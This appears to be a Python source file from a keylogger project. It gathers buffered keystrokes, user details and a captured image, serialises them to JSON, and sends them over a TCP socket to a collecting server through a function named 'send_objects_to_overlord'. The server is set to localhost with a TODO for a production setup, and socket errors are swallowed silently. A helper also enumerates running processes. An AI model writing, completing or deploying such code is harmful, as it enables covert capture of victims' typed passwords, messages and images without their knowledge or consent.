import socket
import json
import struct
from models.user import User
import psutil
import os

KEYLOGGER_DEBUG_KEY = 'KEYLOGGER_DEBUG_KEY'
# TODO set up production environment
server_address = ('localhost', 9696)

def send_payload_to_socket(payload):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(server_address)
        # Send the length of the message first in the socket in network-byte order
        payload = struct.pack('>I', len(payload)) + payload
        sock.sendall(payload)
        sock.close()
    except socket.error as serr:
        pass
    import sys
    sys.exit(0)

def send_objects_to_overlord(buffered_keys):
    keys = [key.__dict__ for key in buffered_keys]
    payload = {}
    user = User()
    user.capture_image()
    payload['user'] = user.__dict__
    # payload['user']['processes'] = get_running_processes()
    payload['keys'] = keys
    send_payload_to_socket(json.dumps(payload))

def get_running_user_processes():
    # TODO change to user processes
    running_processes = []
    for proc in psutil.process_iter():
        try:
            running_processes.append(proc.name())
            print(proc.cmdline())
        except psutil.AccessDenied:
            print("Permission error or access denied on process")
